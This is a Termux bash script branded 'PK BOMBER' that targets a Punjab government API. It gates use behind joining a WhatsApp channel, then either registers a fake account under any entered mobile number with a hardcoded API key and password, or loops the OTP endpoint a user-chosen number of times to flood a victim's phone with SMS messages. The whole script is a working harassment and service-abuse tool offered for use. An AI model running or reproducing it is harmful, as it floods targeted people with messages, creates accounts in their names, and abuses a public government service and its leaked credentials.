#!/data/data/com.termux/files/usr/bin/bash

# Show menu
clear
echo -e "\033[1;31m"
echo " ██████╗ ██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ "
echo " ██╔══██╗██║ ██╔╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗"
echo " ██████╔╝█████╔╝     ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝"
echo " ██╔═══╝ ██╔═██╗     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗"
echo " ██║     ██║  ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║"
echo " ╚═╝     ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝"
echo -e "\033[0m"
echo -e "\033[1;33m> Developer: OLD-HACKER\033[0m"
echo -e "\033[1;34m----------------------------------------\033[0m"

# WhatsApp channel requirement
echo -e "\033[1;32m"
echo "YOU MUST JOIN OUR WHATSAPP CHANNEL TO USE THIS TOOL"
echo "Channel Link:"
echo "https://whatsapp.com/channel/0029VavHzv259PwTIz1XxJ09"
echo -e "\033[0m"
echo -e "\033[1;34m----------------------------------------\033[0m"

read -p "Have you joined the channel? (y/n): " joined
if [ "$joined" != "y" ]; then
    echo "Please join our WhatsApp channel first!"
    exit 1
fi

echo ""
echo "Choose an option:"
echo "1) Register New User"
echo "2) Regenerate OTP Multiple Times"
read -p "Enter choice [1 or 2]: " choice

# API Base URL
base_url="https://e-epd.punjab.gov.pk"

# Common Headers
headers=(
    -H "app: sans"
    -H "version: 28"
    -H "Content-Type: application/json; charset=UTF-8"
    -H "Host: e-epd.punjab.gov.pk"
    -H "Connection: Keep-Alive"
    -H "Accept-Encoding: gzip"
    -H "User-Agent: okhttp/4.5.0"
    --compressed
)

if [ "$choice" == "1" ]; then
    # Option 1: Register New User
    read -p "Enter Mobile Number: " mobile_number

    response=$(curl -s -X POST "$base_url/api/register" "${headers[@]}" -d '{
      "cnic": "",
      "email": "",
      "name": "Ali khan",
      "mobile_number": "'"$mobile_number"'",
      "password": "Abcd1234$@.",
      "user_type": "3",
      "apiKey": "678A3E23F493F00A2C5985477C52E066",
      "imei": "123",
      "latitude": "0.0",
      "longitude": "0.0",
      "versionCode": "3"
    }')
    
    echo ""
    if [[ $response == *"success"* ]]; then
        echo -e "\033[1;32m✅ Registration successful!\033[0m"
    else
        echo -e "\033[1;31m❌ Registration failed\033[0m"
    fi
    echo "$response"

elif [ "$choice" == "2" ]; then
    # Option 2: Regenerate OTP
    read -p "Enter Mobile Number: " mobile_number
    read -p "How many times to send OTP? " otp_count

    for ((i=1; i<=otp_count; i++))
    do
        echo -ne "\rSending OTP #$i..."
        response=$(curl -s -X POST "$base_url/api/sns_generate_mobile_otp" "${headers[@]}" -d '{
          "mobile_number": "'"$mobile_number"'"
        }')
        
        if [[ $response == *"success"* ]]; then
            echo -ne "\r\033[1;32m✅ OTP #$i sent successfully!\033[0m"
        else
            echo -ne "\r\033[1;31m❌ OTP #$i failed to send\033[0m"
        fi
        echo ""
        sleep 1
    done

else
    echo "Invalid choice. Exiting."
fi
